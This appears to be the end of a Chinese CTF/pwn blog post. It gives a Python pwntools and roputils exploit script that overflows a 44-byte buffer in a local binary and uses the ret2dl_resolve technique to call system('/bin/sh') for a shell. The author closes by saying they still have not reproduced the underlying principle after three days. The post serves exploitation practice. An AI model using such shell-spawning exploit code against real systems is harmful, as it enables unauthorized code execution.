<p>exp：<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import sys</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x8048390</span><br><span class="line">bss = 0x0804a040</span><br><span class="line">vulFunc = 0x804852d</span><br><span class="line"></span><br><span class="line">p = process('./pwn')</span><br><span class="line"><span class="comment"># p = remote('202.120.7.202', 6666)</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">def getReloc(elf, base):</span><br><span class="line">    jmprel = elf.dynamic('JMPREL')</span><br><span class="line">    relent = elf.dynamic('RELENT')</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    return reloc_offset</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP('./pwn')</span><br><span class="line">addr_bss = rop.section('.bss')</span><br><span class="line"></span><br><span class="line"><span class="comment"># step1 : write sh &amp; resolve struct to bss</span></span><br><span class="line">buf1 = 'A' * offset <span class="comment">#44</span></span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line">buf2 =  rop.string('/bin/sh')</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, 'system')</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 : use dl_resolve_call get system &amp; system('/bin/sh')</span></span><br><span class="line">buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)</span><br><span class="line">p.send(buf3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<p>原理我已经搞了三天了，仍然没复现出来！！！！！</p>

        
        <br>
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
        本站总访问量<span id="busuanzi_value_site_pv"></span>次
       </p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "search.json"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
